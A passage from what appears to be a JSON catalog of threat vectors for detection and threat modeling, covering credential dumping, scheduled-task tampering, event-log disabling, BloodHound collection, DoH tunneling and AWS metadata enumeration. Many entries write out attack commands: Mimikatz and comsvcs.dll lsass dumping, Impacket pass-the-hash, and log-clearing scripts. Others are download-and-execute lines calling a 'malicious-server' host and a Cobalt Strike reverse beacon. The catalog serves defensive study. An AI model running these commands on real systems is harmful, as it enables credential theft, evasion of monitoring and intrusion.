                "description": "A credential file download to Windows compromised endpoint\nrefers to a process where an attacker downloads sensitive\ncredential files to this system. A threat actor usually\ntarget to download files containing passwords, authentication\ntokens, or other sensitive information. Threat actors may use\nremote tools to download Windows credential files and to\nextract their content if its decrypted ref [1], [2].  \n\n### Methods used by the threat actors\n\nThreat actors may use various methods to download credential files,\nfor example:\n\n- SMB (Server Message Block) exploitation: Attackers may exploit\nvulnerabilities in SMB to gain access to the compromised endpoint\nand download credential files.\n- PowerShell scripts: Attackers may use PowerShell scripts to\ndownload credential files from the compromised endpoint.\n- Remote Desktop Protocol (RDP): Attackers may use RDP to gain\naccess to the compromised endpoint and download credential files.\n- Malware: Attackers may use malware to download credential files\nfrom the compromised endpoint.\n- Curl for Windows (via HTTP requests) - Adversaries could abuse\n`Curl` to download files or upload data to a remote URL address\nref [2].  \n- Remote Desktop PassView - this tool can access Windows credential\nfiles via .rdp files. It's possible such file to contain user's\ncredentials ref [3]. \n\n### Known types of files which may contain user's credentials \n\nThe following types of credential files may be downloaded by the\nattackers through a compromised network:\n\n- SAM (Security Account Manager) files: These files contain hashed\npasswords for local user accounts.\n- NTDS.DIT files: These files contain hashed passwords for Active\nDirectory user accounts.\n- Credential Manager files: These files contain stored credentials\nfor applications and services.\n- SSH key files: These files contain private SSH keys used for\nauthentication.  \n\n### An example \n\nThreat actors can download and use the accessed credential user's\nfiles to connect to a database further, without having to enter\nlogin credentials each time they access the database. The database\nsystem will authenticate their login based on the information\nstored in the credential file.   \n"
            },
            "ec8201d4-c135-406b-a3b5-4a070e80a2ee": {
                "name": "Credential manipulation on local Windows endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Credential manipulation on a local Windows endpoint refers to an act of\nmodifying, altering, or stealing sensitive information such as usernames,\npasswords, and other authentication data.   \n\nAn example of credential manipulation could be the usage of a tool, for\nexample like Mimikatz to extract login credentials from memory or to\nmanipulate and modify existing credentials stored on the local system.\nThe threat actor could use these manipulated credentials to gain\nunauthorized access to other systems or network resources.   \n\nThe threat actors abuse and some legitimate administrator tools, such as\nthe Microsoft Sysinternals tool: ProcDump or Task Manager to dump lsass.exe\nprocess memory and to collect credentials. This approach is common and\nknown as \"living-off-the-land\", which means usage of legit native Windows\ntools in order to avoid possible detection.   \n\nThreat actors can gather, modify or delete credentials on the local Windows\nsystem also by using Windows Explorer manually or with scrips to access\nlocal files that may store user's or system credentials. For example\nKeepass or other local databases which contain passwords.   \n\nExamples:   \n\nThreat actors are using Mimikatz LSADUMP Module to collect SAM registry\nhashes.   \n\nlsadump::sam   \n\nOr to extract credentials from LSASS Dump files. \nMimikatz module lsass.exe dumps credentials in a more stealthy mode.\nThe lsass.exe process manages many user credential secrets and can be\nassociated with credential theft behavior.   \n\nsekurlsa::minidump lsass.dmp\nlog lsass.txt\nsekurlsa::logonPasswords   \n\nFor extracting of Domain Controller cached credentials is used LSADUMP module:\nlsadump::cache   \n\nLocally, the threat actors can run sekurlsa Mimikatz module to obtain logon\ncredentials:   \n\nsekurlsa::Minidump lsassdump.dmp\nsekurlsa::logonPasswords   \n\nBuilt-in Windows tools such as comsvcs.dll can also be used:   \n\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full   \n\nThere are variety of different tools that the threat actors use for\nmemory dump, for example:   \n\n- Taskmgr.exe\n- ProcDump\n- ProcessExplorer.exe\n- Process Hacker\n- SQLDumper\n- PowerSploit \u2013 Out-MiniDump\n- VM Memory Dump Files\n- Hibernation Files   \n"
            },
            "cfc6369a-e3df-4827-bb0d-969342f1558c": {
                "name": "Credential manipulation on remote Windows endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors can perform credential manipulation on a remote Windows\nendpoint with a variety of tools like: Mimikatz, WMIExec, WinRM-based,\nPsExec, SMBExec or PowerShell or others to extract credentials from\na credential storage point on the endpoint, as example from the endpoint's\nmemory. This can be done by an attacker who already has gained access to\nand control of one endpoint.\n\nRequirements:\n\n- permissions to access the remote machine\n- permission/ability to run credential dumping tools\n- or an ability to start a service remotely\n\nImpacket PsExec example with username and password:\n\npython3 psexec.py <domain>/<user>:<pass>@<target_host>\n\nor an option with NTLM hashes\n\npython3 psexec.py -hashes <lmhash>:<ntlmhash> <domain>/<user>@<target_host>\n\nExample for Impacket SMBExec with plaintext credentials and NTLM hashes:\n\npython3 smbexec.py \"<domain>/<user>:<password>\"@<target_host>\n\npython3 smbexec.py -hashes <lmhash>:<ntlmhash> <domain>/<user>@<target_host>\n\nImpacket suite contains a python script and can read the content of the\nregistry keys and decrypt the LSA Secrets passwords.\n\nExample:\n\nimpacket-secretdump -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL\n"
            },
            "22c2fc38-93f5-41ee-be2d-a7737fa2b936": {
                "name": "Cron manipulation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Suspicious cron activity refers to the insertion or modification of scheduled tasks\n(cron jobs) on Unix-like systems (including Linux and macOS) in order to achieve \nor maintain unauthorized persistence. This technique takes advantage of the legitimate \ncron scheduling service to run malicious commands at regular intervals.  \n\nIn practice, a threat actor will add a hidden or obfuscated entry to `/etc/crontab`, \nuser-specific cron files (e.g., `/var/spool/cron/`), or \nsystem-wide cron directories (e.g., `/etc/cron.d/`). \nThese hidden entries often execute scripts that download additional malware, \nexfiltrate data, or establish a persistent backdoor.\n\nSome known threat actors has leveraged cron-based jobs to deploy cryptocurrency miners \nand move laterally within compromised environments, often targeting cloud-based \nor containerized setups. \nAttackers have also been identified using stealthy cron modifications to maintain \na foothold on victim systems, execute remote commands, and ensure that malicious binaries \nare relaunched even after a reboot.\n"
            },
            "53063205-4404-4e6d-a2f5-d566c6085d96": {
                "name": "Data collection using SharpHound, SoapHound, Bloodhound and Azurehound",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The threat vector of data collection using SharpHound, BloodHound, and AzureHound \nrepresents a sophisticated method for gathering and analyzing information about \nan organization's Active Directory (AD) and Azure environments. This vector is \nparticularly concerning because it can be used by both security professionals and \nmalicious actors to map out potential attack paths and vulnerabilities.    \n\n## Tools Overview    \n\n**SharpHound**: A data collection tool designed for Active Directory environments. \nIt gathers information about users, groups, computers, and their relationships within \nthe AD structure.    \n\n**BloodHound**: A visualization tool that ingests data collected by SharpHound and \nAzureHound. It presents the information in a graph format, allowing for the identification \nof complex attack paths and security misconfigurations.    \n\n**AzureHound**: The cloud counterpart to SharpHound, specifically designed to collect \ndata from Azure Active Directory and Azure Resource Manager.    \n\n**SoapHound**: It is an enumeration tool in Active Directory Web Services (ADWS) debug logs. \nADWS enumeration creates multiple GetXmlValue events for each attribute, it leverages the ADWS \nprotocol (SOAP over port 9389) instead of traditional LDAP queries.\nLDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS server \nusing NET TCP Binding communication channel. Following, ADWS server unwraps the LDAP queries\nand forwards them to the LDAP server running on the same Domain Controller. As a result, LDAP\ntraffic is not sent via the wire and therefore is not easily detected by common monitoring tools.\n\n\n## Threat Vector Mechanics    \n\nThe mechanics of this threat vector involve the systematic collection, processing, \nand analysis of data from Active Directory (AD) and Azure environments to identify \npotential attack paths. Here's how it works:    \n\n1. **Data Collection**:  - **SharpHound** gathers data from Active Directory using LDAP/LDAPS queries   and RPC over named pipes. It collects information on domain trusts, object properties   (users, groups, computers, etc.), ACLs, group memberships, and more.  - **AzureHound** collects data from Azure AD and Azure Resource Manager (AzureRM)   using Microsoft Graph and Azure REST APIs. It retrieves information about admin   roles, users, groups, apps, devices, service principals, and other Azure objects   accessible to the authenticated user.  - These tools generate JSON files containing detailed information about the target   environment.    \n\n2. **Data Packaging**:  - The collected data is compressed into ZIP files for efficient transfer and   storage. These files are ready for ingestion into the BloodHound database.    \n\n3. **Data Ingestion**:  - The ZIP files are imported into a Neo4j graph database via the BloodHound interface.   This database serves as the backbone for analyzing relationships and permissions   within the collected data.    \n\n4. **Graph Analysis**:  - BloodHound visualizes the data as a graph where nodes represent objects   (e.g., users, groups, computers) and edges represent relationships or permissions   (e.g., group memberships or access rights).  - Users can perform Cypher queries to identify attack paths such as privilege   escalation opportunities or lateral movement routes.    \n\n5. **Attack Path Discovery**:  - The visualized graph highlights misconfigurations or exploitable relationships   that attackers can leverage (e.g., accounts with excessive privileges or vulnerable trust relationships).    \n\nThis process enables attackers to systematically uncover weaknesses in AD or Azure \nenvironments for exploitation.\n\n### How the Threat Works\n\n- **Stealthy Protocol**: SOAPHound uses ADWS, which is less commonly monitored than \nLDAP, allowing attackers to collect data with minimal detection.\n- **Bulk Collection**: It gathers large amounts of directory data-such as users, \ngroups, computers, group memberships, and access control lists (ACLs)-in a few bulk \nqueries rather than thousands of individual LDAP requests.\n- **Sensitive Information**: The data collected includes everything needed to map \nattack paths, identify privilege escalation opportunities, and plan lateral movement \nwithin the AD environment.\n- **BloodHound Compatibility**: The output is formatted for BloodHound, a tool used \nto visualize and analyze attack paths in AD.\n\n### Key Data Collected\n\n- **User and Group Listings**: Names, SIDs, group memberships.\n- **Computer Accounts**: Details about machines in the domain.\n- **ACLs/Permissions**: Who has rights over what objects.\n- **Certificate Authority Info**: For potential abuse in AD CS attacks.\n"
            },
            "e2b93649-44d7-4007-9592-3baf79cd2b33": {
                "name": "Deletion of Security Descriptor (SD) value in registry for scheduled task",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A Security Descriptor (SD) is a data structure that specifies the security\nattributes of an object in Windows operating system. These attributes\ninclude the permissions and access rights granted to users and groups, as\nwell as any security measures that have been applied to the object.\n\nSecurity Descriptor determines the users allowed to run specific task. If\nthe SD value is deleted within the registry tree path, this deletion\nresults in \u201cdisappearing\u201d of the task from \u201cschtasks /query\u201d and Task\nScheduler.\n\nSome malware families, for example Tarrask malware can use security\ndescriptors to create scheduled tasks that are hidden from the user and are\nnot visible in the Windows Task Scheduler. These tasks are used to execute\nthe malware's malicious payload, which can include installing additional\nmalware, stealing sensitive information, or disrupting the normal operation\nof the infected system.\n\nTo evade detection, a malware modifies the security descriptor of the\nscheduled task to grant only the SYSTEM account access to the task. This\nmeans that other users and security tools will not be able to see or\ninteract with the task, making it more difficult to detect and remove.\n\nSecurity professionals can use tools such as Sysinternals Autoruns and\nProcess Explorer to identify and remove these hidden scheduled tasks, as\nwell as other forms of malware that use security descriptors for defense\nevasion.\n"
            },
            "d2ca077d-6ec6-4442-bdc5-b1822e9f4ae8": {
                "name": "Deletion of Tasks or Tree registry keys in scheduled task hives",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors are using deletion of tree registry keys to remove\ninformation related to their activities, for example created previously\nscheduled tasks. For the deletion of tree registry keys, the threat actors\nare using reg command in command-line utility with a parameter delete,\nPowerShell commands or scripts or manually delete the registry keys from\nRegistry Editor (regedit). In Azure cloud infrastructure threat actors use\nAzure CloudShell to delete registry keys.\n\nExample for registry keys created upon creation of a new scheduled task:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}\n\nThe registy keys above can be deleted using the \"reg delete\" command. The \n\"reg delete\" command deletes the specified registry key and all of its \nsubkeys.\n\nreg delete \"HKEY_LOCAL_MACHINE\\Registry_Key\" /f\n\nExamples for deleting registry keys with PowerShell commands:\n\nRemove-Item -Path HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME -Force -Verbose\n\nor\n\nGet-Item Remove-Item -Path HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME | Remove-Item -Force -Verbose\n\nWhere Get-Item command retrieves the Key name and then Remove-Item uses the\nresult from Get and deletes the key registry.\n\nTo delete registry keys using Azure CloudShell threat actors are using\nRemove-ItemProperty cmdlet in Windows PowerShell or the rm command in Bash.\n\nExamples:\n\nRemove-ItemProperty -Path \"HKLM:\\Software\\MyKey\" -Name \"MyValue\"\n\nrm \"HKLM:\\Software\\MyKey\"\n"
            },
            "3c4d13c9-d40f-4f97-b8fa-607b6f7ad263": {
                "name": "Deletion of Windows Scheduled Task XML file",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "When a scheduled task is created, different artifacts related to the task\nare generated and stored in a XML file. This XML file contains all of the\ninformation about the task, including the name, triggers, actions, and\nother settings. In the xml code in the section \"Actions\" is stored a path\nto the running task, for example \u201cC:\\Windows\\System32\\task.exe\u201d. Threat\nactors may delete the corresponding XML file to a scheduled task to hide\ntheir activities on the system. Threat actors can delete the XML file\nmanually from C:\\Windows\\System32\\Tasks folder or by using CMD or other\nCLId/shells, bash, or PowerShell scripts.\n\nExample for deletion of XML file with bash commands:\n\ncd /mnt/c/Windows/System32/Tasks\nrm taskname.xml\n\nExample for deletion of XML file with PowerShell commands:\n\ncd C:\\Windows\\System32\\Tasks\nRemove-Item taskname.xml\n\nIn cloud infrastructures threat actors are using command-line interface\n(CLI) like CloudShell in Azure. \n\nExample: \n\nNavigate to the path where the XML file is stored and delete the file with\nthe command \"del\":\n\ncd C:\\Windows\\System32\\Tasks\ndel taskname.xml\n\nDeleting the XML file will only remove the task from the Task Scheduler.\nIt will not uninstall any programs or delete any files that were associated\nwith the task.\n"
            },
            "efe13bd7-c621-423b-b226-9b536766a252": {
                "name": "Direct modification of registry keys to tamper scheduled task",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Direct modification of registry keys to tamper with scheduled tasks\ninvolves altering the Windows Registry to manipulate or disable scheduled\ntasks. \n\nScheduled tasks are stored in the Windows Registry, and modifying these\nregistry keys can allow an attacker to:\n\n- Disable or modify existing tasks: by changing the registry keys\nassociated with a scheduled task, an attacker can prevent the task from\nrunning or alter its behavior.\n- Create new malicious tasks: An attacker can add new registry keys\nto create a malicious scheduled task that runs without the user's\nknowledge.\n- Elevate privileges: modifying registry keys can allow an attacker\nto escalate privileges, enabling them to execute tasks with higher\nprivileges.\n\nThe registry keys which involved in scheduled tasks could be:\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\n\n```\nThis key contains subkeys for each scheduled task, including:\n\n- Tasks: Stores information about each task, such as the task name,\ndescription, and execution settings.\n- Boot: Stores information about tasks that run at boot time.\n- Logon: Stores information about tasks that run at logon time.\n\n### Modifying registry keys to tamper with scheduled tasks\n\nTo modify registry keys and tamper with scheduled tasks, an attacker\nwould typically follow these steps:\n  - Access the Registry Editor: The attacker would need to access the  Windows Registry Editor (Regedit.exe) with administrative privileges.  - Navigate to the scheduled task registry key.   The attacker would navigate to the registry key:  `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache key`.  - Identify the target task: The attacker would identify the subkey  associated with the scheduled task they want to modify or disable.  - Modify the registry key: The attacker would modify the registry  key to change the task's behavior, such as changing the execution  settings or disabling the task.  \n\n### Examples of registry key modifications\n\nSome examples of registry key modifications that can tamper\nwith scheduled tasks include:\n\n- Disabling a task: Setting the Enabled value to 0 in the task's subkey.\n- Changing the task's execution settings: Modifying the Actions or Triggers\nvalues in the task's subkey.\n- Creating a new malicious task: Adding a new subkey with malicious\nsettings, such as executing a malicious executable.  \n"
            },
            "497ccceb-c012-4830-aa61-4a046e7b6ce9": {
                "name": "Disable swapping paging devices",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Disable Swapping/Paging Devices is a tactic adversaries may employ to impair defenses, \nhamper forensic analyses, or disrupt normal system operations. \nBy turning off, deleting, or misconfiguring the system\u2019s paging file or swap space, \nmalicious actors can limit the ability of the operating system to manage memory efficiently.  \n\n## Evade Detection : Certain security tools or analysis processes rely on paging \nand memory snapshots. Disabling the swap or page file can complicate memory captures, \nobstructing forensic investigators from retrieving certain artifacts.  \n\n## Cause Operational Instability : Without a functioning page file, systems may slow down \nor crash once physical RAM is fully consumed. This can be used intentionally to disrupt \nbusiness operations or create an opening for other malicious activities \nwhile defenders are distracted.  \n\n## Hide Malicious Components : Some malware frameworks attempt to evade detection \nby maintaining all malicious code in volatile memory. If system memory is not paged to disk, \nthere is a slimmer trail of evidence left in permanent storage (e.g., pagefile.sys in Windows).  \n\n### Windows \n```powershell\nwmic computersystem where name=\"%computername%\" set AutomaticManagedPagefile=False\nwmic pagefileset where name=\"C:\\\\pagefile.sys\" delete\n```\nThis sequence disables the automatic page file management \nand removes the page file on the C: drive.\n\n### Linux\n```bash\nswapoff -a\nsed -i '/swap/d' /etc/fstab\n```\nThis one disable all swap spaces and remove swap references from `/etc/fstab`, \nensuring the change persists on reboot.\n"
            },
            "e5e4397f-eea4-423b-8b71-9b30d34a9d59": {
                "name": "Disable Windows event logging through PowerShell",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors can use PowerShell to disable Windows event logging.\nThey use this technique for example to disable diagnostic eventlogs\nor some individual Windows log (for example: Application, Security\nor System log).\n\nDisabling of Application log can cause lost of the tracks for specific\napplication, for example: lack of visibility for authentication, time of\nlogon, failure events of the application or other related application\ndetails.\n\nThreat actors may disable Security Event log to prevent detection of\ntheir logons on the system: number of logons, timestamp of the logon and \nwith what privilege account and username they logon on the system. \n\nPowerShell command to clear event logs with 'Disable-EventLog' cmdlet:\n\nDisable-EventLog -LogName \"Parameter\"\nwhere the \"Parameter\" can be Application, Security or System\n\nExample how to clear individual logs with -ListLog parameter:\n\n(Get-WinEvent -ListLog *).LogName | %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_)}\n\nThe threat actors can specify the logname and clear an individual log with:\n[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"Microsoft-Windows-FailoverClustering/Diagnostic\")\n\nWith the following section the Event log is disabled competely:\n\n$wineventlog = get-winevent -ListLog \"Microsoft-Windows-FailoverClustering/Diagnostic\" -ComputerName hyperv-01\n$wineventlog.IsEnabled = $false\n$wineventlog.SaveChanges()\n\nIf the threat actors want to disable multiple event logs at once, they can\nuse a loop in their customly prepared PowerShell script to iterate through a\nlist of event log names and disable them one by one.\n\nExample:\n\n# Create a list of event log names to disable\n$eventLogs = \"Application\", \"System\", \"Security\"\n\n# Iterate through the list of event logs and disable them one by one\nforeach ($eventLog in $eventLogs) {\nDisable-EventLog -LogName $eventLog\n}\n\nThis script will disable the \"Application\", \"System\", and \"Security\" event logs on the local computer.\nThere is an option to modify the list of event logs to include any other specific event log that the\nthreat actor wants to disable.\n"
            },
            "dbbeb66b-cb18-4055-8af4-808a8efdc748": {
                "name": "Disabling of Windows event logging through registry entries",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors can disable Windows event logs by adding, deleting or modifying\nregistry entries manually or with commands in a command-line prompt. \n\nThe threat actor may disable the Windows Event log events manually via\nEvent Viewer properties or with CLI commands to disable a specific event or\nall of them. Threat actors may also use script files or PowerShell to change\nthe registry.\n\nIf the threat actors want to disable event logging manually via registry\nentries, they have to find the associated GUID to the event that will delete. The\nGUID can be taken for example from Event Viewer > Select specific event log\n> Event Properties > in Details select \"XML view\". (example for GUID id:\nGiud=\"{BD12F3B8-4DE1-TR31-DE39RET84L12}\") After this the threat actor\nnavigates to the registry with the GUID that needs to delete and change\nthe value of the dword in the registry key \"Enabled\" to 0.\n\nExample: \n\n1. Example for disabling the logging of all event logs via registry entry:\n\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\" /v Start /t REG_DWORD /d 4 /f\n\n2. Example for disabling the logging of a specific event log via registry entry:\n\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog[Log Name]\" /v TypesSupported /t REG_DWORD /d 0 /f\n\n3. Manual change in the registry of the registry key \"Enable\" (dword value) to 0.     Registry:   HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System\n  Dword value change in the registry key \"Enable\":\n  \"Enabled\"=dword:0  \"EnableProperty\"=dword:0\n\nExample for change of Audit policies in the registries:\n\npsexec -s -i regedit (the command needs system-level access to run)\nAfter that in HKLM\\SECURITY\\Policy\\PolAdtEv registry hive in the registry\neditor \"Edit Binary Value\", 16-bit (two-byte) values can be changed to\n00 00 which means no audit. For example replace the data started with \n01 00 01 00 to 00 00 00 00\n\n- 00 00 means no auditing\n- 01 00 means success auditing\n- 02 00 means failure auditing\n- 03 00 means all auditing\n"
            },
            "f3a392f7-3268-4c54-8bfa-8117b784f520": {
                "name": "DLL Execution over Rundll32",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "Rundll32.exe is a powerful asset for adversaries to proxy execution of arbitrary\nand malicious code. It is flexible and efficient for loading code into memory,\nas may load malicious DLLs by ordinals, function names or directly.\nRundll32.exe has a certain degree of trust; which can result in a possible\nAppLocker and Software Restriction Policies (SRP) bypass.\n\nAdversaries rely on distinct vectors to infect their targets, who might get\ninfected. Upon successful exploitation, malicious actors have been seen executing\nDLL files using Rundll32.exe for multiple purposes; such as download and execute a\npayload from a remote server (DLL path could be both local and remote when the DLL\nis hosted on a SMB share using UNC paths), contact C&C server to upload stolen data\nor dump LSASS process memory to obtain credentials.\n"
            },
            "901dd804-00cc-4034-85aa-3d10e257c16c": {
                "name": "DNS over HTTPS tunneling exfiltrates data or communicates to C&C server",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "DNS over HTTPS (DoH) tunneling is a technique used by threat actors\nto exfiltrate data or communicate to a Command and Control (C&C)\nserver. The data exchange and transfer between the victim and the\nattacker's server can include - data exfiltration (stolen data) as\nconfidential documents or files, PIIs, financial data or intellectual\nproperty. The data flow can be also an administrative traffic like\ncovert C&C communication, for example - chat or messaging traffic,\nfile (malicious payload) transfers, system control, manipulation\ninstructions and other possible signaling or instructions transfer.\n\nDoH is a protocol that encrypts DNS requests and responses, making\nit more difficult for third parties to intercept and manipulate DNS\ntraffic. However, threat actors have found a way to exploit this\nprotocol for malicious purposes ref [1].      \n\nIn a DoH tunneling attack, the threat actor uses the DoH protocol\nto encapsulate malicious data, such as stolen credentials, sensitive\ninformation, or malware, within DNS requests. The encrypted DNS requests\nare then sent to a C&C server, which can be hosted on a compromised domain\nor a domain controlled by the threat actor ref [2].    \n\nA threat actor can use some of the following initial access techniques\nor methods to perform DNS over HTTPS tunneling:   \n\n- Compromises a device: Gains access to a victim's device, either through\nphishing, exploiting vulnerabilities, or using malware.\n- Installs malware: Installs malware on the compromised device, which can\nbe designed to collect sensitive information, such as login credentials\nor personal data.\n- Configures DoH: Configures the device to use DoH, either by modifying\nthe device's DNS settings or by installing a malicious DoH client.\n- Encapsulates data: Encapsulates the stolen data within DNS requests,\nusing techniques such as:\n- Data encoding: Encoding the data using techniques like Base64 or\nhexadecimal encoding.\n- Data fragmentation: Breaking the data into smaller fragments and\nsending them across multiple DNS requests.\n- Sends DNS requests: Sends the encrypted DNS requests to the C&C\nserver, which can be hosted on a compromised domain or a domain\ncontrolled by the threat actor.\n- Exfiltrates data: The C&C server receives the DNS requests, extracts\nthe encapsulated data, and stores or forwards it to the threat actor.\n"
            },
            "765be5d9-4f79-4e3d-b894-fa428f285ab5": {
                "name": "Download and Execute Payloads with Windows Utilities",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "1. Bitsadmin.exe\\\n**Description**: A command-line tool to create and manage BITS jobs. \nThreat actors use it to download or upload files stealthily.\n\nExample:\n\n```\nbitsadmin.exe /transfer myJob /download /priority high http://malicious-server/payload.exe C:\\temp\\payload.exe\nstart C:\\temp\\payload.exe\n```\n\n2. Certutil.exe\\\n**Description**: A command-line tool for manipulating certificates. \nIt can be used to download files and perform Base64 encoding/decoding.\n\nExample:\n\n```\ncertutil.exe -urlcache -split -f http://malicious-server/payload.exe C:\\temp\\payload.exe\n```\n\n3. Wmic.exe\\\n**Description**: Windows Management Instrumentation Command-line (WMIC) is \na command-line utility that provides a powerful interface to the \nWindows Management Instrumentation (WMI) infrastructure. \nIt allows administrators to perform management tasks on both local and remote Windows systems\n\nExample:\n\nExecute payload on a local machine:\n```\nwmic process call create \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \\\"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server/payload.ps1')\\\"\"\n```\n\nExecute a remote script:\n```\nwmic /node:\"REMOTE_COMPUTER_NAME\" process call create \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \\\"Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\payload.exe'; Start-Process 'C:\\\\Windows\\\\Temp\\\\payload.exe'\\\"\"\n```"
            },
            "349348ca-66f5-41d2-8610-6bb61556d773": {
                "name": "Duplicate an access token in a new process to elevate privileges",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "An adversary can use automated solutions like CobaltStrike framework\nto create a new process with a duplicated token to escalate privileges \nand bypass access controls. An adversary can duplicate a desired access \ntoken with DuplicateToken(Ex) and use it with CreateProcessWithTokenW \nto create a new process running under the security context of the \nimpersonated user. This is useful for creating a new process under \nthe security context of a different user.\n\nThe new process runs in the security context of the specified token. \nIt can optionally load the user profile for the specified user.\nUsually the function CreateProcessWithTokenW is running like \na process winbase.h \n\nThe process that calls CreateProcessWithTokenW must have \nSE_IMPERSONATE_NAME privilege. \n\nAdversaries commonly use token stealing to elevate their security context \nfrom the administrator level to the SYSTEM level. An adversary can use a \ntoken to authenticate to a remote system as the account for that token if the \naccount has appropriate permissions on the remote system.\n\nExample for spawn of a process with token duplication:\nThe process spawn is usually with PID (Process Identifier): 2572\n\nspawn windows/beacon_https/reverse_https (<ip_address>:443) \nin a high integrity process (token duplication)\n"
            },
            "e7f05c4e-ca96-45e5-9788-116f802e1f32": {
                "name": "Enumerate EC2 instance data using AWS metadata service",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors collect AWS IDs from EC instances by using AWS metadata\nservice that is running by default. AWS account ID is a unique identifier\nthat is used to identify an AWS account, AWS resource management or to\naccess to AWS services.\n\nThreat actors can extract different elements from metadata service, for\nexample: \n\n- accountId\n- architecture\n- availabilityZone\n- billingProducts\n- devpayProductCodes\n- marketplaceProductCodes\n- imageId\n- instanceId\n- instanceType\n- kernelId\n- pendingTime\n- privateIp\n- ramdiskId\n- region\n- version\n\nAWS metadata keeps information for the instance such as instance id,\nAMI id, hostname, ip address, security groups, public-ip and others.\nInstance metadata usually is divided into different categories. Instance\nmetadata build based on the category is specified with a new version\nnumber. In some cases the instance metadata is available only when a new\nbuild version is launched. The categories are classified for example by\nelastic-gpu-id, role-name, instance-type, operation system (windows, mac or\nlinux), ami-id (Amazon Machine Image ID), public-ip, vhostmd and by the\nversion when category was released.\n\nExamples: \n\nCategory:                                        Version ID:\nami-id                                           1.0\nblock-device-mapping/ami                         2007-12-15\nelastic-gpus/associations/elastic-gpu-id         2016-11-30\niam/security-credentials/role-name               2012-01-12\nnetwork/interfaces/macs/mac/public-hostname      2011-01-01\n\nThreat actors can extract information from the AWS metadata service with\nthe user token and curl command. For curl commands - cURL tool is usually\nused for automation of AWS metadata information collection. \n\nTools like curl on *nix-based systems, or Invoke-Rest Method in PowerShell\non Windows are used for extraction of AWS metadata as they send GET requests\nfor data collection. AWS exposes an Instance Metadata endpoint on every EC2 \nInstance at the address: http://169.254.169.254\n\nExample: \n\ncurl http://169.254.169.254/latest/meta-data/\n\nOR\n\nCurl command with a token for extraction of additional matadata information: \n\nTOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/dynamic/instance-identity/document\n\nExample for extraction of AWS metadata with bash script:\n\nINSTANCEID=$(curl -sL http://169.254.169.254/latest/meta-data/instance-id)\n$ echo INSTANCEID\n"
            },
            "ca2751c7-8641-4fb0-a90b-30c5987015dc": {
                "name": "Externally controlled Azure credentials added to an Enterprise app or its SPN",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors may assign valid azure credentials to an Azure Enterprise App or its SPN (service\nprincipal). NSA writes in its advisory that the app was seen leveraged\nto access emails from the Enterprise app, but the attack vector could be\nused for many other types of leverage.\n"
            },
            "59d2eb7f-63cd-4ac4-9608-e65663fea667": {
                "name": "FileFix technique abuses Windows Explorer to execute commands",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
